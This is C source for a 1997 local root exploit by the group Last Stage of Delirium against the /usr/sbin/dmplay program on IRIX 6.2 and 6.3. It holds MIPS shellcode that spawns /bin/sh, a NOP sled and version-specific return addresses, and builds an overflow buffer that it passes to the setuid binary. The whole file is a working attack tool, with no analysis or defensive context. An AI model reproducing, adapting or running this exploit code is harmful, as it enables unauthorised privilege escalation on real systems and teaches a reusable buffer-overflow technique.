                /*## copyright LAST STAGE OF DELIRIUM oct 1997 poland        *://lsd-pl.net/ #*/
                /*## /usr/sbin/dmplay                                                        #*/

                #define NOPNUM 800
                #define ADRNUM 156
                #define PCHNUM 148
                #define TMPNUM 52

                char shellcode[]=
                    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
                    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
                    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
                    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
                    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
                    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
                    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
                    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
                    "\x03\xff\xff\xcc"    /* syscall                      */
                    "/bin/sh"
                ;

                char jump[]=
                    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
                    "\x03\xe0\x00\x08"    /* jr      $ra                  */
                ;

                char nop[]="\x24\x0f\x12\x34";

                main(int argc,char **argv){
                    char buffer[10000],adr[4],pch[4],tmp[4],*b,*envp[2],display[128];
                    int i;

                    printf("copyright LAST STAGE OF DELIRIUM oct 1997 poland  //lsd-pl.net/\n");
                    printf("/usr/sbin/dmplay for irix 6.2 6.3 IP:17,19,20,21,22,32\n\n");

                    if(argc!=3){
                        printf("usage: %s {62|63} xserver:display\n",argv[0]);
                        exit(-1);
                    }

                    if(!strcmp(argv[1],"62")){
                        *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10396+32;
                        *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10396+32+900+30540;
                        *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10396+32+8000;
                    }
                    if(!strcmp(argv[1],"63")){
                        *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+10348+32;
                        *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+10348+32+900-84;
                        *((unsigned long*)tmp)=(*(unsigned long(*)())jump)()+10348+32+8000;
                    }

                    sprintf(display,"DISPLAY=%s",argv[2]);
                    envp[0]=display;
                    envp[1]=0;

                    b=buffer;
                    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
                    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
                    *b++=0xff;
                    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
                    for(i=0;i<TMPNUM;i++) *b++=tmp[i%4];
                    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
                    *b=0;

                    execle("/usr/sbin/dmplay","lsd",buffer,0,envp);
                }
